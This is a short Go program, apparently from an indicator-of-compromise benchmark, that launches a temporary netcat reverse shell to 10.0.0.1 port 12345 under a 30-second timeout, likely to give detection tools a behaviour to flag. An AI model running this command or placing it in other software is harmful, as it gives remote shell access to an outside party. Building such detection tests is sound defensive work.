//go:build !windows

// Launches a temporary reverse shell using netcat
package main

import (
	"log"
	"time"

	"github.com/tstromberg/ioc-bench/pkg/iexec"
)

func main() {
	if err := iexec.WithTimeout(30*time.Second, "nc", "10.0.0.1", "12345", "-e", "sh"); err != nil {
		log.Fatalf("run failed: %v", err)
	}
}
